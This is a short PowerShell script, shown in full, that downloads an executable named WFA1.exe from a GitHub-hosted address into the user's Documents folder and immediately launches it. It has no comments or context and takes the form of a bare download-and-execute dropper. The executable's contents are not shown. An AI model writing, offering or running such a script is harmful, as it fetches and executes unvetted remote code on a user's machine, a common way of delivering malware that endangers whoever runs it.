$uri = "https://github.com/webntdev/webntdev.github.io/raw/main/files/WFA1.exe"
$cale = "$env:USERPROFILE\Documents\WFA1.exe"
Start-Sleep -Seconds 1
Invoke-WebRequest -Uri $uri -OutFile $cale -ErrorAction Stop
Start-Process -FilePath $cale -Wait
